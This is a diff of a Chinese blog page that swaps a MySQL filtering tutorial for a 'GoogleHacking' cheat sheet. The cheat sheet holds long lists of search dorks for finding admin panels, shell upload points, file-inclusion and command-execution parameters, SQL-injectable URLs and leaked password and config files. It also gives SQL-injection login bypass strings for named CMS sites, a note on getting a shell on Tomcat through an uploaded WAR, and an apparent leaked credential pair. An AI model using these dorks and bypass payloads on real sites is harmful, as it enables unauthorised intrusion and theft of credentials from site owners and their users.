@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>MySql(数据过滤) | ZJR&#39;blog</title>
-  <meta name="keywords" content=" MySql_where , MySql_like ">
-  <meta name="description" content="MySql(数据过滤) | ZJR&#39;blog">
+  <title>GoogleHacking | ZJR&#39;blog</title>
+  <meta name="keywords" content=" Google Hacking ">
+  <meta name="description" content="GoogleHacking | ZJR&#39;blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="收集自大佬 基本命令intitle:    从网页标题中搜索指定的关键字 inurl:      从url中搜索指定的关键字 allinurl:   结果的url中包含多个关键词。例如allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令 intext:     从网页中搜索指定的关键字 filetype:   搜索指定的文件后缀 site">
 <meta property="og:type" content="article">
@@ -668,9 +668,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-MySql-Course03" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-GoogleHacking" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">MySql(数据过滤)</h1>
+        <h1 class="article-title">GoogleHacking</h1>
     
     <div class="article-meta">
         
@@ -678,28 +678,26 @@
         
         <span class="book">
             
-                <a  data-rel="MySqlCourse">MySqlCourse</a>
+                <a  data-rel="Tips">Tips</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a class="color2">MySql_where</a>
-            
-            <a class="color1">MySql_like</a>
+            <a class="color5">Google Hacking</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-11 21:30:24'>2020-02-02 10:55</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-27 22:20:45'>2020-04-27 22:18</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.1k</span>
+        <span>字数:2.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -718,7 +716,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤数据"><span class="toc-text">过滤数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#where子句操作符"><span class="toc-text">where子句操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#where的简单应用"><span class="toc-text">where的简单应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空值检查"><span class="toc-text">空值检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据过滤-过滤数据的进阶"><span class="toc-text">数据过滤(过滤数据的进阶)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AND操作符"><span class="toc-text">AND操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OR操作符"><span class="toc-text">OR操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算次序"><span class="toc-text">计算次序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN操作符"><span class="toc-text">IN操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NOT操作符"><span class="toc-text">NOT操作符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用通配符进行过滤"><span class="toc-text">用通配符进行过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#百分号（-）通配符"><span class="toc-text">百分号（%）通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下划线（-）通配符"><span class="toc-text">下划线（_）通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用通配符的技巧"><span class="toc-text">使用通配符的技巧</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本命令"><span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通配符"><span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#综合使用"><span class="toc-text">综合使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#针对性使用"><span class="toc-text">针对性使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat"><span class="toc-text">tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic"><span class="toc-text">weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jboss"><span class="toc-text">jboss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websphere"><span class="toc-text">websphere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmyadmin"><span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webmin"><span class="toc-text">webmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordpress"><span class="toc-text">wordpress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla"><span class="toc-text">joomla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#drupal"><span class="toc-text">drupal</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#特征查找"><span class="toc-text">特征查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的后台地址"><span class="toc-text">常见的后台地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传点"><span class="toc-text">上传点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含命令执行"><span class="toc-text">文件包含命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#商城类"><span class="toc-text">商城类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS"><span class="toc-text">CMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#万能密码"><span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#敏感信息泄露"><span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目录遍历"><span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#遗留webshell"><span class="toc-text">遗留webshell</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -734,109 +732,294 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>指定搜索条件。<br>主要是对where子句学习，以及where子句与一些关键字和子句的综合使用。</p>
-<h2 id="过滤数据"><a href="#过滤数据" class="headerlink" title="过滤数据"></a>过滤数据</h2><h3 id="where子句操作符"><a href="#where子句操作符" class="headerlink" title="where子句操作符"></a>where子句操作符</h3><table>
-<thead>
-<tr>
-<th align="center">操作符</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">=</td>
-<td align="center">等于</td>
-</tr>
-<tr>
-<td align="center">&lt;&gt;</td>
-<td align="center">不等于</td>
-</tr>
-<tr>
-<td align="center">!=</td>
-<td align="center">不等于</td>
-</tr>
-<tr>
-<td align="center">&lt;</td>
-<td align="center">小于</td>
-</tr>
-<tr>
-<td align="center">&lt;=</td>
-<td align="center">小于等于</td>
-</tr>
-<tr>
-<td align="center">&gt;</td>
-<td align="center">大于</td>
-</tr>
-<tr>
-<td align="center">&gt;=</td>
-<td align="center">大于等于</td>
-</tr>
-<tr>
-<td align="center">between</td>
-<td align="center">在指定的两个值之间</td>
-</tr>
-</tbody></table>
-<h3 id="where的简单应用"><a href="#where的简单应用" class="headerlink" title="where的简单应用"></a>where的简单应用</h3><blockquote>
-<p>select prod_name,prod_price<br>from products<br>where prod_price = 2.50;<br><img src="1.png" alt=" "></p>
-</blockquote>
+        <p>收集自<a href="https://klionsec.github.io/2014/12/14/search-hacking/#menu" target="_blank" rel="noopener">大佬</a></p>
+<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><pre><code class="txt">intitle:    从网页标题中搜索指定的关键字
+inurl:      从url中搜索指定的关键字
+allinurl:   结果的url中包含多个关键词。例如allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令
+intext:     从网页中搜索指定的关键字
+filetype:   搜索指定的文件后缀
+site:       在某个指定的网站内搜索指定的内容
+link:       搜索与该链接有关的链接
+movie:      当我们用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。(当前只支持英文Google)
+define:     查询关键词的词义，起的是字典的作用。Google会返回包含查询关键词定义的网页，例define:computer
+info:       查询网站的一些信息。例如info:bbs.byr.cn，它只会返回一个结果，是一个选择列表，列表的选项是这个网站的某一方面的信息。info=cache+related+link+site+intext+intitle。</code></pre>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><pre><code class="txt">+      强制包含某个字符进行查询
+-      查询时忽略某个字符
+&quot;&quot;     查询时精确匹配双引号内的字符
+.      匹配某单个字符进行查询
+*      匹配任意字符进行查询
+|      或者逗号(,)多个选择,只要有一个关键字匹配即可
+AND    逻辑与，这个命令我们其实一直都在用，只是没有意识到。一般用空格代替，还可以用“+”代替。例如霹雳布袋+败亡之剑，返回的结果同时包含两者。</code></pre>
+<h2 id="综合使用"><a href="#综合使用" class="headerlink" title="综合使用"></a>综合使用</h2><pre><code class="txt">查找后台地址：      site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms
+查找文本内容：      site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username
+查找可注入点：      site:域名 inurl:aspx|jsp|php|asp
+查找上传漏洞：      site:域名 inurl:file|load|editor|Files
+查看脚本类型：      site:域名 filetype:asp/aspx/php/jsp
+迂回策略：          inurl:cms/data/templates/images/index/
+网络设备关键词：    intext:WEB Management Interface for H3C SecPath Series
+存在的数据库：      site:域名 filetype:mdb|asp|#</code></pre>
+<h2 id="针对性使用"><a href="#针对性使用" class="headerlink" title="针对性使用"></a>针对性使用</h2><p>对常见框架及后台的搜索</p>
+<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>如果使用暴力破解成功突破tomcat的basic认证，上传恶意war包，可以很轻易的getshell</p>
+<pre><code class="txt"># site用于限制查询范围,intitle和intext用于匹配tomcat关键字
+intitle:apache tomcat site:domain
+intext:$CATALINA_HOME/webapps/ROOT/ intitle:apache tomcat site:domain
+intext:$CATALINA_HOME/webapps/ROOT/ inurl:8080/ site:domain</code></pre>
+<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><pre><code class="txt"># site用于限制查询范围,inurl和intitle用于匹配weblogic的关键字
+inurl:/console/login/LoginForm.jsp site:domain
+inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogic Server site:domain
+inurl:/console/login/ intitle:&quot;Oracle WebLogic Server 管理控制台&quot; site:domain</code></pre>
+<h3 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h3><pre><code class="txt"># site用于限制查询范围,inurl用于匹配jboss的关键字
+inurl:/jmx-console/htmladaptor site:domain</code></pre>
+<h3 id="websphere"><a href="#websphere" class="headerlink" title="websphere"></a>websphere</h3><pre><code class="txt"># site用于限制查询范围,inurl用于匹配websphere的关键字
+inurl:/ibm/console/logon.jsp site:domain</code></pre>
+<h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><pre><code class="txt"># site用于限定范围,inurl和intext用于匹配phpMyAdmin的关键字
+inurl:/phpMyAdmin site:domain
+inurl:/phpMyAdmin/index.php site:domain
+inurl:/phpMyAdmin/index.php site:domain db+information_schema
+inurl:/phpMyAdmin/index.php intext:phpMyAdmin site:domain</code></pre>
+<h3 id="webmin"><a href="#webmin" class="headerlink" title="webmin"></a>webmin</h3><p>webmin是一个web版的linux系统管理工具，默认情况下工作在web的10000端口上</p>
+<pre><code class="txt"># site用于限制查询范围 intitle和intext用于匹配webmin的关键字
+intitle:Login to Webmin intext:&quot;login to the Webmin server on&quot; site:domain</code></pre>
+<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><pre><code class="txt"># site用于限制查询范围,inurl和index of用于匹配wordpress的关键字
+inurl:/wp-login.php  site:domain
+index of /wp-content/uploads inurl:/wp-login.php site:domain
+inurl:/wp-content/themes/theagency site:domain</code></pre>
+<h3 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h3><pre><code class="txt"># site用于限制查询范围,inurl用于匹配joomla的关键字
+inurl:/administrator/index.php site:domain
+inurl:index.php?option=com_advertisementboard site:domain 找注入
+inurl:index.php?option=com_carocci site:domain
+inurl:index.php?option=com_product site:domain
+inurl:/administrator/index.php site:domain</code></pre>
+<h3 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h3><pre><code class="txt"># site用于限制查询范围,inurl和intext用于匹配drupal的关键字
+inurl:CHANGELOG.txt intext:drupal intext:&quot;SA-CORE&quot; -site:github.com -site:domain</code></pre>
+<h2 id="特征查找"><a href="#特征查找" class="headerlink" title="特征查找"></a>特征查找</h2><pre><code class="txt"># 在使用时最好加上site限制查询范围,且版本号也可忽略
+power by wordpress                powered by discuz x3.2
+powered by phpcms 2008            powered by drupal 7
+powered by dedecmsv57_gbk         powered by CubeCart 3.0.6
+Powered by phpBB 2.0.6            powered by paBugs 2.0 Beta 3
+inurl:wp-login.php                inurl:/administrator/index.php
+inurl:/admina.php</code></pre>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>outlook邮箱</p>
 <blockquote>
-<p>select prod_name,prod_price<br>from products<br>where prod_name = ‘fuses’;<br><em>MySql在执行匹配时默认不区分大小写，所以fuses与FUSES匹配</em><br><img src="2.png" alt=" "></p>
+<p>inurl:/owa/auth/logon.aspx site:domain</p>
 </blockquote>
+<p>vpn</p>
 <blockquote>
-<p>select prod_name,prod_price<br>from products<br>where prod_price &lt; 10;<br><img src="3.png" alt=" "></p>
+<p>inurl:/sslvpn site:domain</p>
 </blockquote>
+<p>mirapoint</p>
 <blockquote>
-<p>select prod_name,prod_price<br>from products<br>where prod_price &lt;= 10;<br><img src="4.png" alt=" "></p>
+<p>inurl:/cgi-bin/search.cgi site:domain<br>inurl:/cgi-bin/madmin.cgi site:domain</p>
 </blockquote>
+<p>zimbra</p>
 <blockquote>
-<p>select vend_id,prod_name<br>from products<br>where vend_id &lt;&gt; 1003;<br>与<br>select vend_id,prod_name<br>from products<br>where vend_id != 1003;<br>相同<br><img src="5.png" alt=" "></p>
+<p>inurl:7071/zimbraAdmin/ site:domain<br>inurl:/help/en_US/standard/version.htm site:domain</p>
 </blockquote>
+<p>svn</p>
 <blockquote>
-<p>select prod_name,prod_price<br>from products<br>where prod_price between 5.99 and 10;<br><img src="6.png" alt=" "><br><em>注：这里5.99和10都能被返回，所以between and 相当于 &gt;= and &lt;=</em></p>
+<p>inurl:/.svn/entries site:domain</p>
 </blockquote>
-<h3 id="空值检查"><a href="#空值检查" class="headerlink" title="空值检查"></a>空值检查</h3><p>NULL无值（no value），与字段0、空字符串或仅仅包含空格不同。</p>
-<blockquote>
-<p>select cust_id,cust_email<br>from customers<br>where cust_email is null;<br><img src="7.png" alt=" "><br><em>注：不能通过NULL值来过滤，从而返回具有NULL值的行。因为未知具有特殊含义，数据库不知道它们是否匹配，所以在匹配过滤或不匹配过滤时不返回它们。因此，在过滤数据时，一定要验证返回数据中确实给出了被过滤列具有NULL的行。</em><br><em>注：输入的过滤参数类型需要与对应字段的数据类型一致，例如prod_price的数据类型为int型则输入参数为数字，不需要加引号。</em><br><em>注：在同时使用order by和where时，order by应该位于where之后。</em></p>
-</blockquote>
-<h2 id="数据过滤-过滤数据的进阶"><a href="#数据过滤-过滤数据的进阶" class="headerlink" title="数据过滤(过滤数据的进阶)"></a>数据过滤(过滤数据的进阶)</h2><p>主要是对AND、OR、IN、NOT关键字的组合使用。</p>
-<h3 id="AND操作符"><a href="#AND操作符" class="headerlink" title="AND操作符"></a>AND操作符</h3><blockquote>
-<p>select prod_id,prod_price,prod_name<br>from products<br>where vend_id = 1003 and prod_price &lt;= 10;<br><img src="8.png" alt=" "><br>可以添加多个过滤条件，每添加一条就要使用一个AND。</p>
-</blockquote>
-<h3 id="OR操作符"><a href="#OR操作符" class="headerlink" title="OR操作符"></a>OR操作符</h3><blockquote>
-<p>select vend_id,prod_name,prod_price<br>from products<br>where vend_id = 1002 OR vend_id = 1003;<br><img src="9.png" alt=" "></p>
-</blockquote>
-<h3 id="计算次序"><a href="#计算次序" class="headerlink" title="计算次序"></a>计算次序</h3><p>列出价格为10美元（含）以上且由1002或1003制造的所有产品。</p>
-<blockquote>
-<p>select prod_name,prod_price<br>from products<br>where vend_id = 1002 or vend_id = 1003 and prod_price &gt;= 10;<br><img src="10.png" alt=" "><br>如上所示，在结果中出现了价格低于10的产品。这是由于在检索时先做and计算，再做or计算。and的优先级要高于or。<br>正确的语句：<br>select prod_name,prod_price<br>from products<br>where (vend_id = 1002 or vend_id = 1003) and prod_price &gt;= 10;<br><img src="11.png" alt=" "><br>加上括号后，计算次序发生改变，优先计算括号内。即先根据括号内的语句过滤数据，再根据括号外的语句进一步过滤。<br>多条语句同时作用时，应该使用圆括号来明确计算的次序，以免产生歧义。</p>
-</blockquote>
-<h3 id="IN操作符"><a href="#IN操作符" class="headerlink" title="IN操作符"></a>IN操作符</h3><p>IN操作符用来指定条件范围，范围中的每个条件都可以进行匹配。IN取合法值的逗号分隔的清单，全都在括号中。</p>
-<blockquote>
-<p>select prod_name,prod_price<br>from products<br>where vend_id in (1002,1003)<br>order by prod_name;<br><img src="12.png" alt=" "><br>由此可见IN操作符完成的功能与OR相同。</p>
-</blockquote>
-<p><strong>IN操作符的优点：</strong></p>
-<ul>
-<li>在使用长的合法选项清单时，IN操作符的语法更清楚直观</li>
-<li>计算次序更容易管理</li>
-<li>一般情况下IN操作符的执行速度比OR操作符更快</li>
-<li>可以包含其他SELECT语句</li>
-</ul>
-<h3 id="NOT操作符"><a href="#NOT操作符" class="headerlink" title="NOT操作符"></a>NOT操作符</h3><p>用来否定它之后所跟的任何条件。</p>
-<blockquote>
-<p>select prod_name,prod_price<br>from products<br>where vend_id not in (1002,1003)<br>order by prod_name;<br><img src="13.png" alt=" "><br>MySql支持使用NOT对IN、BETWEEN和EXISTS子句取反。</p>
-</blockquote>
-<h2 id="用通配符进行过滤"><a href="#用通配符进行过滤" class="headerlink" title="用通配符进行过滤"></a>用通配符进行过滤</h2><p>利用LIKE操作符进行</p>
-<h3 id="百分号（-）通配符"><a href="#百分号（-）通配符" class="headerlink" title="百分号（%）通配符"></a>百分号（%）通配符</h3><p>%表示任何字符出现任意次数。</p>
-<blockquote>
-<p>select prod_id,prod_name<br>from products<br>where prod_name like ‘jet%’;<br>检索以产品名以jet开头的产品，搜索模式为‘jet%’<br><img src="14.png" alt=" "><br>通配符可以在搜索模式中任意位置使用<br>select prod_id,prod_name<br>from products<br>where prod_name like ‘%anvil%’;<br><img src="15.png" alt=" "><br><em>注：尾空格可能会干扰通配符匹配。例如在保存anvil时，如果后面有一个或多个空格，则子句where prod_name like ‘%anvil’将不会匹配它们，因为l后面还有字符。</em><br><em>注：通配符不能匹配用值NULL作为参数的行。</em></p>
-</blockquote>
-<h3 id="下划线（-）通配符"><a href="#下划线（-）通配符" class="headerlink" title="下划线（_）通配符"></a>下划线（_）通配符</h3><p>下划线通配符用法与百分号通配符一样，但只匹配单个字符</p>
-<blockquote>
-<p>select prod_id,prod_name<br>from products<br>where prod_name like ‘_ ton anvil’;<br><img src="16.png" alt=" "></p>
-</blockquote>
-<h3 id="使用通配符的技巧"><a href="#使用通配符的技巧" class="headerlink" title="使用通配符的技巧"></a>使用通配符的技巧</h3><ul>
-<li>不要过度使用，因为通配符搜索的处理时间比之前学习的其他搜索所花的时间更长</li>
-<li>除非必要，否则不要把它们用在搜索模式的开始处</li>
-<li>仔细注意通配符的位置</li>
-</ul>
+<h2 id="常见的后台地址"><a href="#常见的后台地址" class="headerlink" title="常见的后台地址"></a>常见的后台地址</h2><pre><code class="txt">inurl:/manager/login.php site:domain
+inurl:/cms/login.php site:domain
+inurl:/manage/index.php site:domain
+inurl:/system/login.php site:domain
+inurl:/webadmin/login.php site:domain
+inurl:admin_login.php intitle:admin login site:domain
+inurl:admin_login.php intitle:admin page site:domain
+inurl:/admin/login.php site:domain
+inurl:/admin/index.php site:domain
+inurl:/system/adminlogin.asp  site:domain
+inurl:/manage/login.aspx  site:domain
+inurl:/sysadm/index.php  site:domain
+intext:&quot;Website Design &amp; Developed By : WebSay&quot;  默认后台/admin
+intext:&quot;Powered by ENS Consultants&quot;  默认后台/admin/login.php
+intext:&quot;Desenvolvimento - MW Way&quot;    默认后台/admin/index.php
+inurl:.php?id= intext:&quot;Web realizada por Soma Estudio&quot;
+inurl:/_mycps/login.php
+intext:&quot;design by weli&quot;   默认后台: /adm/login.php 除了弱口令还有注入(linjizen@gmail.com/lin719192)
+inurl:categorysearch.php?indus= site:domain     SQL注入</code></pre>
+<h2 id="上传点"><a href="#上传点" class="headerlink" title="上传点"></a>上传点</h2><pre><code class="txt">intext:&quot; Powered by JADBM &quot;   JADBM Cms upload shell 注册后登陆上传即可
+inurl:&quot;/index.php/frontend/login/en&quot;  Estate cms upload shell 注册后登陆上传即可
+inurl:/Content/Roxy_Fileman/   该路径下直接就是上传点
+index of:&quot;filemanager/dialog.php&quot;  该脚本就是上传脚本直接上传即可
+intext:&quot;Desenvolvido por Webnet Soluções Tecnológicas.&quot; fck上传
+inurl:&quot;subir_foto.php&quot; 上传点
+inrul:&quot;/imce?dir=&quot; intitle:&quot;File Browser&quot;
+inurl:&quot;Powered by Vision Helpdesk 3.9.10 Stable&quot; 注册后登陆进去编辑个人配置上传
+index of /admin/fckeditor site:*.tw
+inurl:/ewebeditor/  site:*.tw
+inurl:/admin/upload_file.php
+inurl:/admin/upfile.php
+inurl:/admin/upload.asp</code></pre>
+<h2 id="文件包含命令执行"><a href="#文件包含命令执行" class="headerlink" title="文件包含命令执行"></a>文件包含命令执行</h2><pre><code class="txt">inurl:footer.inc.php?settings=
+inurl:/pb_inc/admincenter/index.php?page=
+inurl:/pnadmin/categories.inc.php?subpage=
+inurl:/index.php??view=src/sistema/vistas/
+inurl:/edit.php?em=file&amp;filename=
+inurl:/path_to_athena/athena.php?athena_dir= 远程包含
+inurl:/path_to_qnews/q-news.php?id=  远程包含
+inurl:/inc/backend_settings.php?cmd=
+inurl:login.action strus2系列执行漏洞利用
+inurl:php?x=                 inurl:php?open=
+inurl:php?visualizar=        inurl:php?pagina=
+inurl:php?inc=               inurl:php?include_file=
+inurl:php?page=              inurl:php?pg=
+inurl:php?show=              inurl:php?cat=
+inurl:php?file=              inurl:php?path_local=
+inurl:php?filnavn=           inurl:php?HCL_path=
+inurl:php?doc=               inurl:php?appdir=
+inurl:php?phpbb_root_dir=    inurl:php?phpc_root_path=
+inurl:php?path_pre=          inurl:php?nic=
+inurl:php?sec=               inurl:php?content=
+inurl:php?link=              inurl:php?filename=
+inurl:php?dir=               inurl:php?document=
+inurl:index.php?view=        inurl:*.php?locate=
+inurl:*.php?place=           inurl:*.php?layout=
+inurl:*.php?go=              inurl:*.php?catch=
+inurl:*.php?mode=            inurl:*.php?name=
+inurl:*.php?loc=             inurl:*.php?f=
+inurl:*.php?inf=             inurl:*.php?pg=
+inurl:*.php?load=            inurl:*.php?naam=
+allinurl:php?page=           allinurl:php?file=
+inurl:php?x=                 inurl:admin.php?cal_dir=
+inurl:php?include=           inurl:php?nav=
+inurl:*.php?sel=             inurl:php?p=
+inurl:php?conf=              inurl:php?prefix=
+inurl:theme.php?THEME_DIR=
+inurl:php?lvc_include_dir=  
+inurl:php?basepath=          inurl:php?pm_path=
+inurl:php?user_inc=          inurl:php?cutepath=
+inurl:php?fil_config=        inurl:php?libpach=
+inurl:php?pivot_path=        inurl:php?rep=
+inurl:php?conteudo=          inurl:php?root=
+inurl:php?configFile         inurl:php?pageurl
+inurl:php?inter_url          inurl:php?url=
+inurl:php?cmd=               inurl:path.php?my=
+inurl:php?xlink=             inurl:php?to=
+inurl:file.php?disp=</code></pre>
+<h2 id="商城类"><a href="#商城类" class="headerlink" title="商城类"></a>商城类</h2><pre><code class="txt">inurl:&quot;.php?catid=&quot; intext:&quot;View cart&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;Buy Now&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;add to cart&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;shopping&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;boutique&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;/store/&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;/shop/&quot;
+inurl:&quot;.php?catid=&quot; intext:&quot;Toys&quot;
+inurl:details.php?BookID=
+inurl:shop.php?do=part&amp;id=</code></pre>
+<h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2><pre><code class="txt">inurl:article.php?ID=        inurl:newsDetail.php?id=
+inurl:show.php?id=           inurl:newsone.php?id=
+inurl:news.php?id=           inurl:event.php?id=
+inurl:preview.php?id=        inurl:pages.php?id=
+inurl:main.php?id=           inurl:prod_detail.php?id=
+inurl:view.php?id=           inurl:product.php?id=
+inurl:contact.php?Id=        inurl:display_item.php?id=
+inurl:item.php?id=           inurl:view_items.php?id=
+inurl:details.asp?id=        inurl:profile.asp?id=
+inurl:content.asp?id=        inurl:display_item.asp?id=
+inurl:view_detail.asp?ID=    inurl:section.php?id=
+inurl:theme.php?id=          inurl:produit.php?id=
+inurl:chappies.php?id=       inurl:readnews.php?id=
+inurl:rub.php?idr=           inurl:pop.php?id=
+inurl:person.php?id=         inurl:read.php?id=
+inurl:reagir.php?num=        inurl:staff_id=
+inurl:gallery.php?id=        inurl:humor.php?id=
+inurl:spr.php?id=            inurl:gery.php?id=
+inurl:profile_view.php?id=
+inurl:fellows.php?id=        inurl:ray.php?id=
+inurl:productinfo.php?id=
+inurl:file.php?cont=         inurl:include.php?chapter=
+inurl:principal.php?param=
+inurl:general.php?menue=     inurl:php?pref=
+inurl:nota.php?chapter=      inurl:php?str=
+inurl:php?corpo=             inurl:press.php?*[*]*=
+inurl:asp?pid=               inurl:php?id=
+inurl:aspx?id=               inurl:jsp?id=
+inurl:do?id=                 inurl:cgi?id=</code></pre>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><pre><code class="txt">inurl:&quot;wladmin/login.asp&quot;  
+Username : &#39;=&#39; &#39;or&#39;
+Password : &#39;=&#39; &#39;or&#39;
+
+intext:POWERED BY Versatile Software Services       默认后台/alogin.aspx
+User ==&gt; &#39;or&#39;&#39;=&#39;
+Pass ==&gt; &#39;or&#39;&#39;=&#39;
+
+inurl:/media.php?hal=login
+Email: &#39;=&#39;&#39;or&#39;@gmail.com
+Pass: &#39;=&#39;&#39;or&#39;
+
+intext:&quot;Powered by : Best Webmasterz.&quot; 默认后台/admin
+User : &#39;=&#39; &#39;OR&#39;
+Pass : &#39;=&#39; &#39;OR&#39;
+
+intext:&quot;Web Design and Maintenance by Cloud 5 Solutions&quot; 默认后台/admin/login.php
+User : &#39;=&#39; &#39;OR&#39;
+Pass : &#39;=&#39; &#39;OR&#39;
+
+intext:&quot;网站设计：火龙科技&quot; 默认后台/maintain/login.php
+Username : &#39;=&#39; &#39;or&#39;
+Password : &#39;=&#39; &#39;or&#39;
+
+intext:&quot;Powered by Moodyworld&quot; 默认后台/admin/
+Username : &#39;=&#39; &#39;or&#39;
+Password : &#39;=&#39; &#39;or&#39;</code></pre>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><pre><code class="txt">site:domain  inurl:/phpinfo.php
+filetype:log &quot;PHP Parse error&quot;| &quot;PHP Warning&quot;
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: mysql_fetch_array()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: getimagesize()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: array_merge()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: mysql_fetch_assoc()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: mysql_result()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: pg_exec()
+site:domain  &quot;id=&quot; &amp; intext:&quot;Warning: require()
+inurl:/robots.txt site:*.*
+inurl:/application/configs/  配置文件名为/application/configs/application.ini
+----------------------------htpasswd--------------------------------
+htpasswd.bak filetype:htpasswd
+-----------------------------cisco vpn----------------------------
+filetype:pcf  &quot;GroupPwd&quot;
+cisco在线密码解密网站==&gt;https://www.unix-ag.uni-kl.de/~massar/bin/cisco-decode
+-----------------ftp 账号密码-----------------------------
+&quot;index of/&quot; &quot;ws_ftp.ini&quot; &quot;parent directory&quot;
+&quot;your password is&quot; filetype:log
+filetype:ini inurl:&quot;serv-u.ini&quot;
+filetype:ini inurl:flashFXP.ini
+filetype:ini ServUDaemon
+filetype:ini wcx_ftp
+filetype:ini ws_ftp pwd
+ext:inc &quot;pwd=&quot; &quot;UID=&quot;
+auth_user_file.txt
+filetype:sql inurl:backup inurl:wp-content
+inurl:/eWebEditor/db/ site:domain
+filetype:xls QQ site:cn</code></pre>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><pre><code class="txt">site:domain index of /admin
+site:domain index of /upfiles
+site:domain index of /fckeditor/editor/
+site:domain index of /admin/uploadfile
+site:domain index of /admin/file
+site:domain index of /system/file
+site:domain index of /phpmyadmin
+site:domain index of /web/backup/
+inurl:/phpmyadmin/index.php site:domain</code></pre>
